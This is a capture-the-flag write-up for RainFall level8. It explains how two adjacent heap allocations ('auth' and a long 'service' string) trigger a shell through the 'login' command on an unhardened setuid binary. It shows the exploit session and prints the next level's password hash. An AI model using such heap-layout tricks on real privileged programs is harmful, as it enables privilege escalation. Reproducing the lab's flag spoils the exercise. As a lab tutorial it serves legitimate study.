# level8

## Header

```bash
ssh level8@192.168.64.9 -p 4242
...
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level8/level8
```

<hr>

## Solution

From the [disassembled code](./source.s) we can see, that `system("/bin/sh")` will be executed if `auth + 32` will be not equal to 0.

But `auth` variable size is only 4 bytes:
```c
if (!ft_strncmp(buf, "auth ", 5)) {
    auth = malloc(4);
    ...
```

A knowledge that `malloc` result lay out in the memory consistently will be useful here. <br>
First we'll allocate `auth` using direct `malloc` call and then allocate `service` using `strdup` that uses `malloc`. <br>
That will produce two consistent memory block, and `auth + 32` will point to some byte in the `service` string.

```bash
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth merrell
0x804a008, (nil) 
service so basically we just need to allocate a string that will be long enough
0x804a008, 0x804a018 
login
$
```

And getting the flag in the shell:
```bash
$ pwd
/home/user/level8
$ cd ../level9
$ ls -la
total 17
dr-xr-x---+ 1 level9 level9   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level9 level9  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level9 level9 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 bonus0 users  6720 Mar  6  2016 level9
-rw-r--r--+ 1 level9 level9   65 Sep 23  2015 .pass
-rw-r--r--  1 level9 level9  675 Apr  3  2012 .profile
$ cat .pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

## References
- [seta and setb](https://stackoverflow.com/questions/44630262/what-do-the-assembly-instructions-seta-and-setb-do-after-repz-cmpsb)
- [asm instructions](https://faydoc.tripod.com/cpu/cmps.htm)